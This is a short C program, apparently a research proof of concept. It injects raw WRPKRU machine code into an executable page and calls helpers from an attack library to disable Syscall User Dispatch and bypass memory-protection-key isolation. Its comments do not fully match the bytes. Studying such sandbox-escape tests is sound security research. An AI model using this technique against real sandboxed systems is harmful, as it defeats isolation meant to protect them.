#define _GNU_SOURCE
#include <unistd.h>
#include <stdlib.h>
#include <stdio.h>
#include <sys/mman.h>
#include <sys/types.h>
#include <string.h>
#include <pthread.h>


#include "_libattack.h"
void *p1;

void* new_thread(void* args){
    printf("executing (p1) = %p\n", p1);
    void (*f1)(void) = (void(*)(void))((char*)p1);
    f1();

    disable_sud();
    sud_test();
    return 0;
}

int main(int argc, char **argv) {
    int r;

    p1 = mmap((void*)0x100000000, PAGE_SIZE*2, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, 0, 0);

    static unsigned char benign_wrpkru[] = {
        0x31, 0xc9,  // xor ecx, ecx
        0x31, 0xd2,  // xor edx, edx
        0xb8, 0x0, 0x0, 0x0, 0x0, // mov eax,0x5555555c
        0x0f, 0x01, 0xef, // wrpku
        0xc3 //ret
    };

    memcpy(p1, benign_wrpkru, 13);
    printf("page = %p\n", p1);

    r = mprotect(p1, PAGE_SIZE, PROT_READ|PROT_EXEC);
    printf("mprotect(p1) = %p\n", p1);

	pthread_t t;
	if(pthread_create(&t, NULL, new_thread, NULL)) {
		fprintf(stderr, "thread creation failed\n");
		return -1;
	}

    void (*f1)(void) = (void(*)(void))((char*)p1+12);
    f1();

    while(true);

    return 0;
}